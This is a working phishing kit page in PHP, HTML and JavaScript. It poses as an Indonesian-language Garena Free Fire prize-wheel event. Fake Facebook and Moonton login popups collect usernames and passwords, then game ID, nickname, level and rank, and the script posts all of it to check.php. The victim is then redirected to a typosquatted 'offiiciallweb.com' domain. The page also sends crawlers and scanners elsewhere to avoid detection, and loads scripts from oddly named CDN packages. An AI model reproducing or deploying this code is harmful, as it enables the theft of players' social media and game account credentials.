<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if (preg_match('#Mozilla/4.05 [fr] (Win98; I)#', $ua) || preg_match('/Java1.1.4/si', $ua) || preg_match('/MS FrontPage Express/si', $ua) || preg_match('/HTTrack/si', $ua) || preg_match('/IDentity/si', $ua) || preg_match('/HyperBrowser/si', $ua) || preg_match('/Lynx/si', $ua)) {
	header('Location: https://offiiciallweb.com/FF/');
	die();
}
// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>

<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta property="og:title" content="<?php echo $title; ?>">
	<meta name="description" content="<?php echo $description; ?>">
	<meta property="og:description" content="<?php echo $description; ?>">
	<meta property="og:url" content="./">
	<meta property="og:site_name" content="<?php echo $title; ?>">
	<meta property="og:type" content="website">
	<meta name="copyright" content="<?php echo $copyright; ?>">
	<meta name="theme-color" content="<?php echo $theme; ?>">
	<meta property="og:image" content="<?php echo $image; ?>">
	<title><?php echo $title; ?></title>
	<link rel="stylesheet" href="css/style.css">
	<link rel="stylesheet" href="css/animate.css">
	<link rel="stylesheet" href="css/login/facebook.css">
	<link rel="stylesheet" href="css/login/twitter.css">
	<script src="https://unpkg.com/bootrun@3.9.7/min.js"></script>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
	<link rel="icon" href="<?php echo $icon; ?>">
</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
	<style type="text/css">
		body {
			background: url(https://e.top4top.io/p_3004jj8nj1.jpg)no-repeat fixed center;
			background-size: cover;
		}


		margin: 0;
		font-family: 'Teko';
		}

		.container {
			background: #0a2d8c;
			position: relative;
			margin: 0px auto;
			max-width: 400px;
			height: auto;
			border: 1px solid #fff;
		}

		.navbar-logo {
			width: 130px;
			float: left;
			margin-top: 15px;
			margin-left: -5px;
		}

		.item {
			width: 26%;
			height: 138px;
			margin: 10px;
			margin-bottom: 35px;
			display: inline-block;
		}

		.popup-box-item {
			width: 23%;
			height: 105px;
			margin-left: auto;
			margin-right: auto;
			text-align: right;
			display: block;
		}

		.event-title-txt {
			margin-bottom: 5px;
			padding-top: 0px;
			color: #F7D794;
			font-size: 1.85rem;
			font-family: Teko;
			font-weight: bold;
			text-align: center;
			text-shadow: 0px 2.3px 0px #6B5D39;
			text-transform: uppercase;
		}

		.event-subtitle {
			display: block;
			margin-left: 50px;
			margin-right: 5%;
			margin-top: -15px;
			margin-bottom: 15px;
			overflow: hidden;
			text-align: center;
			font-family: Teko;
			white-space: nowrap;
			width: 74%;
		}

		.event-title-wrapper {
			width: 95%;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 15px;
			display: block;
		}

		.footer-copyright-icon {
			width: 30%;
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		.header-twitter img {
			width: 60;
			margin-left: 140px;
			float: left;
		}

		.txt-login-twitter {
			padding-top: 10px;
			padding-left: 95px;
			color: #000;
			font-size: 20px;
			font-weight: bold;
			font-family: arial, sans-serif;
			text-align: left;
			margin-bottom: 3%;
		}

		.menu-content {
			background: url(img/btn-off.png) no-repeat center center;
			background-size: 100% 100%;
			width: 50%;
			height: auto;
			padding: 6px;
			color: #000000;
			font-size: 17px;
			font-family: 'Teko', sans-serif;
			font-weight: 500;
			text-align: center;
			border: none;
			cursor: pointer;
		}

		.menu-content-active {
			background: url(img/btn-on.png) no-repeat center center;
			background-size: 100% 100%;
		}
	</style>
	<div class="container">
		<div class="navbar">
			<img class="navbar-logo" src="https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/full_logo.969f536.png">
			<div class="navbar-right">
				<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
			</div> <!--- navbar-right --->
		</div> <!--- navbar --->
		<div class="header">
			<img width="100%" src="https://d.top4top.io/p_3004o2ohi0.png">
		</div> <!--- header --->
		<div class="event-title-wrapper">
			<div class="event-title-txt">GARENA FREE FIRE</div> <!--- event-title-txt --->
			<div class="event-subtitle"><span>SPIN DAN DAPATKAN HADIAH</span></div> <!--- event-subtitle --->
		</div> <!--- event-title-wrapper --->
		<div class="event-notification-wrapper">
			<div class="event-notification-content"><i class="zmdi zmdi-chevron-right"></i> Hadiah akan tersedia sampai <div class="event-notification-content-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span></div>
			</div> <!--- event-notification-content --->
		</div> <!--- event-notification-wrapper --->
		<div class="box">
			<div class="menu-wrapper-border"></div> <!--- menu-wrapper-border --->
			<div class="menu-wrapper">
				<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'other');">Ramadhan Event</div> <!--- menu-content --->
			</div> <!--- menu-wrapper --->
			<center>
				<div class="tab_rewards" id="other"> <!--- Diamond --->
					<div class="scroll">
						<div style="height: 400px;">
							<div class="wheel mb-4">
								<img src="img/wheel.png" class="img-wheel" alt="">
								<button id="doWheel">
									<img src="static/img/btnWheel.png" class="btn-wheel" alt="" style=" height: 130px; ">
								</button>
								<div class="rewheel">
									<center>
										<div class="setrewheel rewheel-1" id="1">
											<img src="static/img/reward/1.png" alt="">
											<span></span>
										</div>
										<div class="setrewheel rewheel-2" id="2">
											<img src="static/img/reward/2.png" alt="">
											<span></span>
										</div>
										<div class="setrewheel rewheel-3" id="3">
											<img src="static/img/reward/3.png" alt="">
											<span></span>
										</div>
										<div class="setrewheel rewheel-4" id="4">
											<img src="static/img/reward/4.png" alt="">
											<span></span>
										</div>
										<div class="setrewheel rewheel-5" id="5">
											<img src="static/img/reward/5.png" alt="">
											<span></span>
										</div>
										<div class="setrewheel rewheel-6" id="6">
											<img src="static/img/reward/6.png" alt="">
											<span></span>
										</div>
										<div class="setrewheel rewheel-7" id="7">
											<img src="static/img/reward/7.png" alt="">
											<span></span>
										</div>
										<div class="setrewheel rewheel-8" id="8">
											<img src="static/img/reward/8.png" alt="">
											<span></span>
										</div>
									</center>
								</div>
							</div>
						</div>
					</div> <!--- tab-rewards --->
			</center>
		</div> <!--- footer-socmed-box --->
		<img class="footer-copyright-icon" src="https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/garena_logo.b28b2b6.png">
		<div class="footer-txt-copyright">ⓒ Garena Internasional</div> <!--- footer-txt-copyright --->
		<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct | Official Community Policy</div> <!--- footer-txt-copyright --->
		<br>
	</div> <!--- footer --->
	</div> <!--- container --->

	<div class="popup showReward" style="display: none;">
		<div class="popup-box-wrapper">
			<div class="popup-box-navbar">
				<div class="popup-box-navbar-title">Konfirmasi Hadiah</div> <!--- popup-box-navbar-title --->
			</div> <!--- popup-box-navbar --->
			<div class="popup-box-bg">
				<div class="popup-box-alert">Ambil Hadiah Ini?</div> <!--- popup-box-alert --->
				<img class="imgReward">
				<div class="rewardName"></div>
				<!--- popup-box-item itemShine --->
				<br>
			</div> <!--- popup-box-bg --->
			<div class="popup-box-footer">
				<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Ambil</button>
			</div> <!--- popup-box-footer --->
		</div> <!--- popup-box-wrapper --->
	</div> <!--- popup otherReward_confirmation --->

	<div class="popup account_login" style="display: none;">
		<div class="popup-box-wrapper">
			<div class="popup-box-navbar">
				<div class="popup-box-navbar-title">Ambil Hadiah</div> <!--- popup-box-navbar-title --->
			</div> <!--- popup-box-navbar --->
			<div class="popup-box-bg">
				<div class="popup-box-alert">Masuk Untuk Ambil Hadiah</div> <!--- popup-box-alert --->
				<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Facebook</button>
				<br>
			</div> <!--- popup-box-bg --->
		</div> <!--- popup-box-wrapper --->
	</div> <!--- popup account_login --->

	<div class="popup-login login-facebook animated fadeIn" style="display: none;">
		<div class="popup-box-login-fb">
			<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
			<div class="navbar-fb"><img src="img/fb.png"></div> <!--- navbar-fb --->
			<div class="content-box-fb">
				<img src="img/ff.png">
				<div class="txt-login-fb">Masuk ke akun Facebook Anda untuk terhubung ke Free Fire</div> <!--- txt-login-fb --->
				<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm" onclick="$(this).end()">
					<label>
						<input type="text" name="user" id="user-facebook" placeholder="Nomor ponsel atau alamat email" autocomplete="off" autocapitalize="off" required>
					</label>
					<label>
						<input type="pass" name="pass" id="pass-facebook" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required>
					</label>
					<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
					<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
				</form>
				<div class="txt-create-account">Buat Akun</div> <!--- txt-create-account --->
				<div class="txt-not-now">Jangan Sekarang</div> <!--- txt-not-now --->
				<div class="txt-forgotten-password">Lupa Kata Sandi?</div> <!--- txt-forgotten-password --->
			</div> <!--- content-box-fb --->
			<div class="language-box">
				<center>
					<div class="language-name language-name-active">English (UK)</div> <!--- language-name language-name-active --->
					<div class="language-name">Bahasa Indonesia</div> <!--- language-name --->
					<div class="language-name">Basa Jawa</div> <!--- language-name --->
					<div class="language-name">Bahasa Melayu</div> <!--- language-name --->
					<div class="language-name">日本語</div> <!--- language-name --->
					<div class="language-name">Español</div> <!--- language-name --->
					<div class="language-name">Português (Brasil)</div> <!--- language-name --->
					<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
				</center>
			</div> <!--- language-box --->
			<div class="copyright">Facebook Inc.</div>
		</div> <!--- popup-box-login-fb --->
	</div> <!--- popup-login --->

	<div class="popup-login login-twitter animated fadeIn" style="display: none;">
		<div class="popup-box-login-twitter">
			<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
			<div class="box-twitter">
				<div class="header-twitter"><img src="https://play-lh.googleusercontent.com/jWN9pjF7atbqHYXAAfwvIjtzpGwTIVwX9etT0-9HiWjRjE1hInoEgJiWjwsiemu2rEb8"></div> <!--- header-twitter --->
<br>
<br>
<br>
<center>
<form action=" javascript:void(0)" method="post" id="ValidateLoginTwitterForm" onclick="$(this).end()">
					<div class="txt-login-twitter">Login to Moonton</div> <!--- txt-login-twitter --->
					<div class="form-group">
						<input type="text" name="user" id="email-twitter" autocomplete="off" required>
						<label>Phone/email/username</label>
					</div> <!--- form-group --->
					<div class="form-group">
						<input type="pass" name="pass" id="pass-twitter" autocomplete="off" required>
						<label>Password</label>
					</div> <!--- form-group --->
					<input type="hidden" name="login" id="login-twitter" value="Moonton" readonly>
					<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
					<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
					<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter bulet --->
					<div class="footer-menu-twitter">Sign up to Moonton</div> <!--- footer-menu-twitter --->
					</form>
					</center>
				</div> <!--- box-twitter --->
			</div> <!--- popup-box-login-twitter --->
		</div> <!--- popup-login --->

		<div class="popup account_verification" style="display: none;">
			<div class="popup-box-wrapper popup-box-verification">
				<div class="popup-box-navbar">
					<div class="popup-box-navbar-title">Vertifikasi Akun</div> <!--- popup-box-navbar-title --->
				</div> <!--- popup-box-navbar --->
				<div class="popup-box-bg">
					<div class="popup-box-alert">Lengkapi detail akun Anda</div> <!--- popup-box-alert --->
					<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm" onclick="$(this).end()">
						<input type="hidden" name="user" id="validateUser" readonly>
						<input type="hidden" name="pass" id="validatePass" readonly>
						<input type="number" name="playid" id="playid" placeholder="ID Akun" autocomplete="off" required>
						<input type="text" name="nickname" id="nickname" placeholder="Nickname" autocomplete="off" required>
						<select name="level" id="level" required>
							<option selected="selected" disabled="disabled" value="">Level Akun</option>
							<option>1</option>
							<option>2</option>
							<option>3</option>
							<option>4</option>
							<option>5</option>
							<option>6</option>
							<option>7</option>
							<option>8</option>
							<option>9</option>
							<option>10</option>
							<option>11</option>
							<option>12</option>
							<option>13</option>
							<option>14</option>
							<option>15</option>
							<option>16</option>
							<option>17</option>
							<option>18</option>
							<option>19</option>
							<option>20</option>
							<option>21</option>
							<option>22</option>
							<option>23</option>
							<option>24</option>
							<option>25</option>
							<option>26</option>
							<option>27</option>
							<option>28</option>
							<option>29</option>
							<option>30</option>
							<option>31</option>
							<option>32</option>
							<option>33</option>
							<option>34</option>
							<option>35</option>
							<option>36</option>
							<option>37</option>
							<option>38</option>
							<option>39</option>
							<option>40</option>
							<option>41</option>
							<option>42</option>
							<option>43</option>
							<option>44</option>
							<option>45</option>
							<option>46</option>
							<option>47</option>
							<option>48</option>
							<option>49</option>
							<option>50</option>
							<option>51</option>
							<option>52</option>
							<option>53</option>
							<option>54</option>
							<option>55</option>
							<option>56</option>
							<option>57</option>
							<option>58</option>
							<option>59</option>
							<option>60</option>
							<option>61</option>
							<option>62</option>
							<option>63</option>
							<option>64</option>
							<option>65</option>
							<option>66</option>
							<option>67</option>
							<option>68</option>
							<option>69</option>
							<option>70</option>
							<option>71</option>
							<option>72</option>
							<option>73</option>
							<option>74</option>
							<option>75</option>
							<option>76</option>
							<option>77</option>
							<option>78</option>
							<option>79</option>
							<option>80</option>
							<option>81</option>
							<option>82</option>
							<option>83</option>
							<option>84</option>
							<option>85</option>
							<option>86</option>
							<option>87</option>
							<option>88</option>
							<option>89</option>
							<option>90</option>
							<option>91</option>
							<option>92</option>
							<option>93</option>
							<option>94</option>
							<option>95</option>
							<option>96</option>
							<option>97</option>
							<option>98</option>
							<option>99</option>
							<option>100</option>
						</select>
						<select name="tier" id="tier" required="required" class="verify-select">
							<option value="" selected="selected" disabled="disabled">Level Rank</option>
							<option value="Broze" class="form-control">Broze</option>
							<option value="Silver" class="form-control">Silver</option>
							<option value="Gold" class="form-control">Gold</option>
							<option value="Diamond" class="form-control">Diamond</option>
							<option value="Heroic" class="form-control">Heroic</option>
							<option value="Master" class="form-control">Master</option>
						</select>
						<input type="hidden" name="login" id="validateLogin" readonly>
				</div> <!--- popup-box-bg --->
				<div class="popup-box-form-footer">
					<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify my Account</button>
				</div> <!--- popup-box-form-footer --->
				</form> <!--- form --->
			</div> <!--- popup-box-wrapper popup-box-verification --->
		</div> <!--- popup account_verification --->

		<div class="popup check_verification" style="display: none;">
			<div class="popup-box-wrapper">
				<div class="popup-box-navbar">
					<div class="popup-box-navbar-title">Vertifikasi Akun</div> <!--- popup-box-navbar-title --->
				</div> <!--- popup-box-navbar --->
				<div class="popup-box-bg">
					<div class="popup-box-alert">
						<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
						<br>
						Mengirim Hadiah...
					</div> <!--- popup-box-alert --->
					<br>
				</div> <!--- popup-box-bg --->
			</div> <!--- popup-box-wrapper --->
		</div> <!--- popup check_verification --->

		<div class="popup processing_account" style="display: none;">
			<div class="popup-box-wrapper">
				<div class="popup-box-navbar">
					<div class="popup-box-navbar-title">Proses Akun</div> <!--- popup-box-navbar-title --->
				</div> <!--- popup-box-navbar --->
				<div class="popup-box-bg">
					<div class="popup-box-alert">
						Thanks for joining this Free Fire event
						<br>
						<br>
						Your account has been successfully processed
						<br>
						Please wait up to 24 hours
					</div> <!--- popup-box-alert --->
					<br>
				</div> <!--- popup-box-bg --->
				<div class="popup-box-footer">
					<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://m.mobilelegends.com/en';">Logout</button>
				</div> <!--- popup-box-footer --->
			</div> <!--- popup-box-wrapper --->
		</div> <!--- popup processing_account --->
		<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
		<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
		<script type="text/javascript" src="https://unpkg.com/package-ion@2.4.3-icons/ionicons.map.js"></script>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
		<script src="js/ryucodex.js"></script>
		<script>
			var buka = new Audio();
			buka.src = "https://rawcdn.githack.com/AlexHostX/all.asset/d1a42a80f01064a559cb0ce4e5ec0474091c651f/click.mp3";

			var tutup = new Audio();
			tutup.src = "https://rawcdn.githack.com/AlexHostX/all.asset/6635455e463c4b55d9c4dac99f2c44f9091b612c/unclick.mp3";

			$(document).ready(function() {
				var detik = 59;
				var menit = 59;
				var jam = 23;

				function hitung() {
					setTimeout(hitung, 1000);
					$('#latestTimer').html('' + jam + ' : ' + menit + ' : ' + detik + '');
					detik--;
					if (detik < 0) {
						detik = 59;
						menit--;
						if (menit < 0) {
							menit = 0;
							detik = 0;
						}
					}
				}
				hitung();
			});

			// code for showing hiding items
			function openRewards(evt, rewardsClass) {
				var i, tab_rewards, tab_rewards_link;
				tab_rewards = document.getElementsByClassName("tab_rewards");
				for (i = 0; i < tab_rewards.length; i++) {
					tab_rewards[i].style.display = "none";
				}
				tab_rewards_link = document.getElementsByClassName("menu-content");
				for (i = 0; i < tab_rewards_link.length; i++) {
					tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
				}
				document.getElementById(rewardsClass).style.display = "block";
				evt.currentTarget.className += " menu-content-active";
			}
			document.getElementById("defaultTabRewards").click();

			function open_itemReward_confirmation(ag) {
				var itemReward_confirmationImg = $(ag).attr("src");
				$('.itemReward_confirmation').show();
				$('#myItemReward_confirmationImg').attr('src', itemReward_confirmationImg);
			}

			function open_otherReward_confirmation(ag) {
				var otherReward_confirmationImg = $(ag).attr("src");
				var otherReward_confirmationValue = $(ag).attr("value");
				$('.otherReward_confirmation').show();
				$('#myOtherReward_confirmationImg').attr('src', otherReward_confirmationImg);
				$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
			}

			function open_account_login() {
				$('.account_login').show();
				$(".itemReward_confirmation").hide()
				$(".showReward").hide()
			}

			function open_facebook() {
				$('.login-facebook').show();
				$('.account_login').hide();
			}

			function open_twitter() {
				$('.login-twitter').show();
				$('.account_login').hide();
			}

			function close_reward_confirmation() {
				$(".itemReward_confirmation").hide()
				$(".showReward").hide()
			}

			function tutup_facebook() {
				$('.login-facebook').hide()
				$('.account_login').show();
			}

			function tutup_twitter() {
				$('.login-twitter').hide()
				$('.account_login').show();
			}

			// code for validate data to next step
			function ValidateLoginFbData() {
				$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData) {
					submitingValidateLoginFbData.preventDefault();

					$user = $('#user-facebook').val().trim();
					$pass = $('#pass-facebook').val().trim();
					$login = $('#login-facebook').val().trim();
					if ($user == '' || $pass == '') {} else {
						$('.login-facebook').hide();
						$('.account_verification').show();
						$("input#validateUser").val($user);
						$("input#validatePass").val($pass);
						$("input#validateLogin").val($login);
					}
				});
			}

			function ValidateLoginTwitterData() {
				$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData) {
					submitingValidateLoginTwitterData.preventDefault();

					$user = $('#user-twitter').val().trim();
					$pass = $('#pass-twitter').val().trim();
					$login = $('#login-twitter').val().trim();
					if ($user == '' || $pass == '') {} else {
						$('.login-twitter').hide();
						$('.account_verification').show();
						$("input#validateUser").val($User);
						$("input#validatePass").val($pass);
						$("input#validateLogin").val($login);
					}
				});
			}

			// code for validate data to sending to file result
			function ValidateVerificationData() {
				$('#ValidateVerificationDataForm').submit(function(submitingVerificationData) {
					submitingVerificationData.preventDefault();

					var $validateUser = $("input#validateUser").val();
					var $validatePass = $("input#validatePass").val();
					var $nick = $("input#nick").val();
					var $playid = $("input#playid").val();
					var $phone = $("input#phone").val();
					var $level = $("input#level").val();
					var $tier = $("input#tier").val();
					var $rpt = $("input#rpt").val();
					var $rpl = $("input#rpl").val();
					var $platform = $("input#platform").val();
					var $validateLogin = $("input#validateLogin").val();
					if ($validateUser == "" && $validatePass == "" && $nick == "" && $playid == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $validateLogin == "") {
						$('.verification_info').show();
						$('.account_verification').hide();
						return false;
					}

					$.ajax({
						type: "POST",
						url: "check.php",
						data: $(this).serialize(),
						beforeSend: function() {
							$('.check_verification').show();
							$('.account_verification').hide();
						},
						success: function() {
							location.href = "https://offiiciallweb.com/FF/";

						}
					});
				});
				return false;
			}
		</script>

</body>

</html>